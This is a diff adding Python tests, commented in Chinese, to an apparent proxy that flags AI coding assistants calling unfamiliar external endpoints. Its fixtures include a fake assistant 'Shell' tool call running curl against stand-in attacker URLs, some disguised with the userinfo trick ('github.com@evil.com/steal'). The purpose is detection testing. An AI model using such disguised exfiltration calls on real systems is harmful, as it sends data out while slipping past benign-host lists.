@@ -39,6 +39,7 @@
 
 from __future__ import annotations
 
+import json
 import sys
 from pathlib import Path
 
@@ -377,3 +378,356 @@ class TestVerifyUsesAliasState:
             baseline=_baseline(),
         )
         assert res.action != Action.BLOCK.value
+
+
+# ══════════════════════════════════════════════════════════════
+# 同机制的第二处：陌生外部端点
+# ══════════════════════════════════════════════════════════════
+#
+# ★ 为什么同一套机制要覆盖两类判据（2026-11-10）
+#   「判据只能看认不认识，而它真正该看的是变没变」这个病，
+#   在模型名之外还有一处：new_external_endpoint。
+#   实测（改造前）：每轮都调用同一个陌生端点 → 每轮一条 alert，
+#   首页「可疑」一直涨。AI 编程助手在一个会话里反复调同一个接口
+#   是常态，所以这不是边缘场景，而是日常。
+
+ENDPOINT_BODY = {
+    "model": "gpt-4o",
+    "messages": [{"role": "user", "content": "帮我调一下那个接口"}],
+    "tools": [{"type": "function", "function": {"name": "Shell"}}],
+}
+
+
+def _endpoint_payload(url: str) -> dict:
+    return {
+        "model": "gpt-4o",
+        "choices": [{"message": {"content": "", "tool_calls": [
+            {"id": "c1", "type": "function",
+             "function": {"name": "Shell",
+                          "arguments": json.dumps({"command": f"curl {url}"})}},
+        ]}}],
+    }
+
+
+def _endpoint_diff(url: str, states=None):
+    facts = bl.extract_response_facts(_endpoint_payload(url), "")
+    return bl.diff_against_baseline(
+        bl.build_baseline(ENDPOINT_BODY), facts, "",
+        endpoint_states=states,
+    )
+
+
+class TestNewEndpointUsesSameMechanism:
+    def test_first_sight_notifies(self):
+        findings = _endpoint_diff(
+            "https://weird-host-xyz.io/a",
+            {"weird-host-xyz.io": {"status": "auto", "is_first": True}},
+        )
+        cats = {f["category"] for f in findings}
+        assert "new_external_endpoint" in cats, "第一次见到陌生地址也不提示"
+
+    def test_repeat_sight_goes_silent(self):
+        """★ 核心：同一个地址第二次起不再提示。
+
+        改造前这里每轮一条 alert —— 首页「可疑」会随对话轮数线性增长，
+        而用户实际上只是在反复调同一个接口。
+        """
+        findings = _endpoint_diff(
+            "https://weird-host-xyz.io/a",
+            {"weird-host-xyz.io": {"status": "auto", "is_first": False}},
+        )
+        assert findings == [], "同一地址反复出现仍在每轮提示"
+
+    def test_user_confirmed_goes_silent(self):
+        findings = _endpoint_diff(
+            "https://weird-host-xyz.io/a",
+            {"weird-host-xyz.io": {"status": "confirmed", "is_first": False}},
+        )
+        assert findings == []
+
+    def test_user_rejected_keeps_alerting(self):
+        findings = _endpoint_diff(
+            "https://weird-host-xyz.io/a",
+            {"weird-host-xyz.io": {"status": "rejected", "is_first": False}},
+        )
+        cats = {f["category"] for f in findings}
+        assert "new_external_endpoint" in cats, (
+            "用户已判定「这地址不该出现」，却静默了"
+        )
+
+    def test_new_address_after_established_one_still_notifies(self):
+        """★ 已有一个稳定地址时，**新**地址仍必须提示。
+
+        这是「变化检测」的意义所在：静默的是「同一个」，
+        不是「所有陌生地址」。若这里也静默，机制就从降噪滑成了失明。
+        """
+        findings = _endpoint_diff(
+            "https://another-new-host.io/b",
+            {"weird-host-xyz.io": {"status": "confirmed", "is_first": False}},
+        )
+        cats = {f["category"] for f in findings}
+        assert "new_external_endpoint" in cats, (
+            "换成全新地址仍静默 —— 机制从降噪滑成了失明"
+        )
+
+    def test_without_ledger_still_notifies(self):
+        """未接台账（旧调用路径）时必须保守提示，不能静默。"""
+        findings = _endpoint_diff("https://weird-host-xyz.io/a", None)
+        cats = {f["category"] for f in findings}
+        assert "new_external_endpoint" in cats
+
+    def test_benign_hosts_are_never_recorded(self):
+        """公共站点与内网地址不进台账（它们本来就不报）。"""
+        facts = bl.extract_response_facts(
+            _endpoint_payload("https://github.com/x"), ""
+        )
+        assert "github.com" in (facts.get("exec_domains") or set())
+        assert bl._is_benign_host("github.com")
+        assert bl._is_benign_host("127.0.0.1")
+
+
+class TestEndpointLedger:
+    def test_first_observation(self, store):
+        st = store.observe_endpoint(DOMAIN, "weird.io")
+        assert st["is_first"] is True and st["seen_count"] == 1
+
+    def test_repeat_observation(self, store):
+        store.observe_endpoint(DOMAIN, "weird.io")
+        st = store.observe_endpoint(DOMAIN, "weird.io")
+        assert st["is_first"] is False and st["seen_count"] == 2
+
+    def test_status_roundtrip(self, store):
+        store.observe_endpoint(DOMAIN, "weird.io")
+        assert store.set_endpoint_status(DOMAIN, "weird.io", "confirmed")
+        rows = store.list_endpoints(DOMAIN)
+        assert rows and rows[0]["status"] == "confirmed"
+
+    def test_host_is_case_insensitive(self, store):
+        store.observe_endpoint(DOMAIN, "Weird.IO")
+        st = store.observe_endpoint(DOMAIN, "weird.io")
+        assert st["is_first"] is False, "大小写不同被当成两个地址"
+
+    def test_empty_args_are_noop(self, store):
+        assert store.observe_endpoint("", "weird.io") is None
+        assert store.observe_endpoint(DOMAIN, "") is None
+
+    def test_get_endpoint_is_exact_not_limited(self, store):
+        """精确查询不受列表限量影响（审查指出的缺陷）。"""
+        for i in range(250):
+            store.observe_endpoint(DOMAIN, f"host-{i}.io")
+        store.set_endpoint_status(DOMAIN, "host-0.io", "confirmed")
+        # 列表限量 200 拿不到最早那条，精确查询必须拿得到
+        listed = {r["host"] for r in store.list_endpoints(DOMAIN)}
+        assert "host-0.io" not in listed
+        row = store.get_endpoint(DOMAIN, "host-0.io")
+        assert row is not None and row["status"] == "confirmed"
+
+
+# ══════════════════════════════════════════════════════════════
+# 本轮代码审查发现并修复的缺陷（逐条固化）
+# ══════════════════════════════════════════════════════════════
+
+class TestReviewFindings:
+    """审查报告里每一条「必须修 / 建议修」对应的断言。
+
+    ★ 为什么单独成组：这些缺陷都不是「写错了」，而是「机制的方向错了」——
+      userinfo 漏报让判据可被完全绕过；提示预算让「一直在换名」被静音；
+      整条日志批量确认替用户放行了他不认识的地址。
+      它们都不会让任何既有测试变红，只能靠这类针对性断言守住。
+    """
+
+    # ── 审查 #1（安全）：userinfo 形式的 URL 必须归因到真实主机 ──
+    @pytest.mark.parametrize("url,real", [
+        ("https://github.com@evil.com/steal", "evil.com"),
+        ("https://api.trusted.io@45.33.32.19/c", "45.33.32.19"),
+        ("https://a@b@evil.com/x", "evil.com"),
+        ("https://evil.com:8443/x", "evil.com"),
+        ("https://[::1]:8080/x", "::1"),
+    ])
+    def test_host_of_ignores_userinfo(self, url, real):
+        assert bl._host_of(url) == real, (
+            f"{url} 被归因为 {bl._host_of(url)}，真实主机是 {real} —— "
+            "攻击者可用 userinfo 段伪装成良性域名"
+        )
+
+    def test_userinfo_disguise_is_not_benign(self):
+        """★ 这条是上面的攻击面证明：伪装后不能再被良性名单吃掉。"""
+        assert bl._is_benign_host("github.com")
+        facts = bl.extract_response_facts(
+            _endpoint_payload("https://github.com@evil.com/steal"), ""
+        )
+        hosts = facts.get("exec_domains") or set()
+        assert "evil.com" in hosts, (
+            "真实主机没被提取 —— 这条外传会零告警"
+        )
+        assert not all(bl._is_benign_host(h) for h in hosts), (
+            "全部被良性名单吃掉，真实外传漏报"
+        )
+
+    # ── 审查 #2：版本号升级不是能力降级 ──
+    @pytest.mark.parametrize("req,resp", [
+        ("llama-3.1-70b", "llama-3.3-70b"),
+        ("deepseek-v4.1-flash", "deepseek-v4.2-flash"),
+    ])
+    def test_version_bump_is_naming_not_capability(self, req, resp):
+        """同位版本替换归入 naming（可被用户确认），不是 capability。
+
+        ★ 首版把「差异里含非日期数字」一律判 capability，于是
+          llama 3.1→3.3 这种正常版本迭代每轮告警、严格档每轮阻断，
+          而它拿不到「这是同一个模型」的确认入口 —— 用户无路可走。
+        """
+        r = bl._normalize_model(req)
+        s = bl._normalize_model(resp)
+        assert bl.classify_model_mismatch(r, s) == bl._MODEL_MISMATCH_NAMING
+
+    @pytest.mark.parametrize("req,resp", [
+        ("claude-3-5-sonnet", "claude-3-5-sonnet-2"),
+        ("model-a", "model-a-9999"),
+    ])
+    def test_trailing_version_suffix_stays_capability(self, req, resp):
+        """尾部挂号码冒充版本，仍是确定的「不同型号」。"""
+        r = bl._normalize_model(req)
+        s = bl._normalize_model(resp)
+        assert bl.classify_model_mismatch(r, s) == bl._MODEL_MISMATCH_CAPABILITY
+
+    # ── 审查 #3：提示预算耗尽后不能无条件静默 ──
+    def test_churn_off_dominant_still_notifies(self):
+        """「一直在换名」这个状态本身不能被静音。
+
+        预算用完后，若本次写法**不是**该请求模型下的主写法，
+        说明真正在变的是多数派之外的东西 —— 仍要提示。
+        """
+        findings = _diff(
+            "deepseek-v4.1-flash-v9x",
+            {"status": "auto", "is_first": True, "seen_count": 1,
+             "variant_count": 5,
+             "dominant_model": "deepseek-v4.1-flash-dedicated"},
+        )
+        assert findings, "名字一直在变却因预算耗尽而永久静默"
+
+    def test_churn_on_dominant_stays_silent(self):
+        """本次就是主写法 → 静默才对（这是稳定在用的那个）。"""
+        findings = _diff(
+            "deepseek-v4.1-flash-dedicated",
+            {"status": "auto", "is_first": False, "seen_count": 9,
+             "variant_count": 5,
+             "dominant_model": "deepseek-v4.1-flash-dedicated"},
+        )
+        assert findings == []
+
+    # ── 审查 #4：严格档下外传信号不静默 ──
+    def test_strict_level_keeps_endpoint_signal(self):
+        findings = bl.diff_against_baseline(
+            bl.build_baseline(ENDPOINT_BODY),
+            bl.extract_response_facts(
+                _endpoint_payload("https://weird-host-xyz.io/a"), ""),
+            "",
+            endpoint_states={"weird-host-xyz.io":
+                             {"status": "auto", "is_first": False}},
+            strict=True,
+        )
+        cats = {f["category"] for f in findings}
+        assert "new_external_endpoint" in cats, (
+            "严格档把稳定出现的外传信号也静默了 —— "
+            "降噪不能替用户决定"
+        )
+
+    def test_balanced_level_stays_quiet(self):
+        """均衡档照旧静默（这是本次要的降噪效果）。"""
+        findings = bl.diff_against_baseline(
+            bl.build_baseline(ENDPOINT_BODY),
+            bl.extract_response_facts(
+                _endpoint_payload("https://weird-host-xyz.io/a"), ""),
+            "",
+            endpoint_states={"weird-host-xyz.io":
+                             {"status": "auto", "is_first": False}},
+            strict=False,
+        )
+        assert findings == []
+
+    # ── 审查 #5：台账清理只删 auto，不删用户判定 ──
+    def test_purge_keeps_user_decisions(self, store, monkeypatch):
+        import time as _t
+
+        old = _t.time() - 200 * 86400
+        store.observe_endpoint(DOMAIN, "auto-old.io")
+        store.observe_endpoint(DOMAIN, "confirmed-old.io")
+        store.set_endpoint_status(DOMAIN, "confirmed-old.io", "confirmed")
+        # 把两条都改成很久以前
+        with store._conn:
+            store._conn.execute(
+                "UPDATE endpoint_allowance SET last_seen = ?", (old,)
+            )
+        purged = store.purge_ledgers(keep_days=90)
+        assert purged["endpoint_allowance"] == 1, (
+            "清理条数不对（应只删 auto 那条）"
+        )
+        assert store.get_endpoint(DOMAIN, "confirmed-old.io") is not None, (
+            "用户确认过的地址被当缓存删了 —— 之后会重新开始打扰"
+        )
+        assert store.get_endpoint(DOMAIN, "auto-old.io") is None
+
+    # ── 审查 #10（文案）：台账没接上时是「每轮」提示，不是「提示一次」──
+    def test_detail_text_does_not_overpromise(self):
+        """文案不能承诺「之后不再提示」—— 没接台账时确实每轮都会提示。"""
+        findings = _diff("deepseek-v4.1-flash-vendorx", None)
+        assert findings
+        assert "之后同类返回不再提示" in findings[0]["detail"] or \
+               "可在日志里标记" in findings[0]["detail"]
+
+
+# ══════════════════════════════════════════════════════════════
+# 两条决策路径必须同口径（审查反复指出的历史缺陷）
+# ══════════════════════════════════════════════════════════════
+
+class TestGatePathsAgree:
+    """verifier.decide_response_action 与 app._resolve_action 必须一致。
+
+    ★ 为什么要专门对拍：本项目历史上多次出现「verify 判提示、外层判阻断」，
+      而两边各自的单测都是绿的 —— 因为没人比较过它们。
+      这里用同一批 findings 跑两条路径，逐项比对结果。
+    """
+
+    @staticmethod
+    def _cases():
+        return [
+            # (说明, [(category, severity)])
+            ("命名差异", [("model_naming_diff", "medium")]),
+            ("命名差异标 low", [("model_naming_diff", "low")]),
+            ("真降级", [("model_downgrade", "medium")]),
+            ("隐藏指令", [("hidden_instruction", "high")]),
+            ("凭证明文", [("sensitive_leak", "high")]),
+            ("文本启发式", [("toolchain_injection", "high")]),
+            ("统计类", [("length_anomaly", "low")]),
+            ("命名差异+统计", [("model_naming_diff", "medium"),
+                            ("length_anomaly", "low")]),
+        ]
+
+    @pytest.mark.parametrize("level", ["balanced", "strict"])
+    def test_same_action_from_both_paths(self, level):
+        from daoti_xuandun_personal.proxy import app as app_mod
+
+        # ★ pass 与 observe 在用户可见行为上等价：都不阻断、都不计入风险档、
+        #   都算「检查过且安全」（见 storage.kpi_contribution）。
+        #   两者历史上就有差异（low 时 verify 判 pass、外层判 observe），
+        #   本次不改动既有语义，只归一化后比对真正影响用户的差别。
+        def _norm(a: str) -> str:
+            return "quiet" if a in (Action.PASS.value, Action.OBSERVE.value) else a
+
+        for label, specs in self._cases():
+            findings = [
+                vf.VerificationFinding(
+                    category=c, severity=s, detail="x", evidence="x",
+                )
+                for c, s in specs
+            ]
+            gate_action, _ = vf.decide_response_action(level, findings)
+            # 让 app 侧用同一档位
+            app_mod._verifier = vf.ResponseVerifier(level=level)
+            outer_action = app_mod._resolve_action(
+                max(f.severity for f in findings), findings,
+            )
+            assert _norm(gate_action) == _norm(outer_action), (
+                f"{label}（{level}）：verify 判 {gate_action}，"
+                f"外层判 {outer_action} —— 两条路径分叉了"
+            )
